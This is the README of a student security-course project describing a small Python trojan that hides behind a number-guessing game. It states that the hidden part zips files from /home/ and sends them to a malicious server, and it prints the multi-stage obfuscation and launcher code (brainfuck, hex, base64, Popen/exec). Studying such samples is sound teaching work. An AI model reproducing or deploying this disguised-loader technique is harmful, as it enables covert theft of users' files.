# little-python-malware

Little python malware for our course _IR313 - Sécurité applicative_ with [Julien Sénéchal](https://github.com/Teckinfor) and myself.


## How it works

It is divided in 2 parts. First, we have a malware running in the background but the user of the program should not notice it because it's hidden behind a small game in the foreground.

The game is a simple shell program where you have to guess the number the program has in mind and it tells you if you are below or above that number :

```
Guess a number between 1 and 100 (type 'q' to quit): 75
    You guessed below the number, try a higher guess ^^
Guess a number between 1 and 100 (type 'q' to quit): 85
    You guessed below the number, try a higher guess ^^
Guess a number between 1 and 100 (type 'q' to quit): 92
    You guessed below the number, try a higher guess ^^
Guess a number between 1 and 100 (type 'q' to quit): 96
    You guessed below the number, try a higher guess ^^
Guess a number between 1 and 100 (type 'q' to quit): 98
    You guessed below the number, try a higher guess ^^
Guess a number between 1 and 100 (type 'q' to quit): 99
    You guessed below the number, try a higher guess ^^
Guess a number between 1 and 100 (type 'q' to quit): 100
    '100' is not a valid number

    Congrats!! You guessed the number correctly ^_^
```

The malware is also quite simple as it will get every file from the `/home/` repository, zip them and send them to a malicious server.


## How the program decrypts itself

1. Decode the brainfuck, it will give us the code to execute next, i.e. this will be the 1-st decoder :

```python
__import__('brainfuck').to_function(decode_program1)()
```

2. Here's the code you get, we'll execute it to get the second decoder :

```python
bytearray.fromhex(bytearray.fromhex(decode_program2).decode()).decode()
```

3. And now, we have the second decoder :

```python
for _ in range(5):
    program1 = __import__('base64').b64decode(program1)
    program2 = bytearray.fromhex(program2).decode()
try: __import__('subprocess').Popen("python3", "-c", program2)
except: pass
exec(program1)
```

It will decode both the program1 and the program2 which are the game and the malware respectively. Then, it will launch the malware in the background and the game in the foreground.

